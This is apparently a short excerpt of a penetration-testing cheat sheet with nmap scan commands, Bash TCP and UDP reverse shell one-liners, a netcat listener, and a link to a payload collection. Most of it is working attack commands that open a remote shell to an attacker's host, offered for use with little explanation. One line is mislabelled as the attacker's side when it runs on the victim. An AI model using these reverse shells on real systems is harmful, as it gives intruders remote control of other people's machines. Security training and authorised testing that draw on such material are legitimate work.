...
```sh
nmap <ip_range> -T1 -F -oA scan_short
```

Much longer scan:

```sh
nmap <ip_range> -T1 -p- -A -oA scan_long
```

Quickly detect vulnerable services:
...
```sh
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 # victim
0<&196;exec 196<>/dev/tcp/<your IP>/<same unfiltered port>; sh <&196 >&196 2>&196 # attacker
```

#### Bash UDP

```sh
sh -i >& /dev/udp/127.0.0.1/4242 0>&1 # victim
nc -u -lvp 4242 # atacker
```
...
https://github.com/swisskyrepo/PayloadsAllTheThings - various vulnerabilities, mostly web
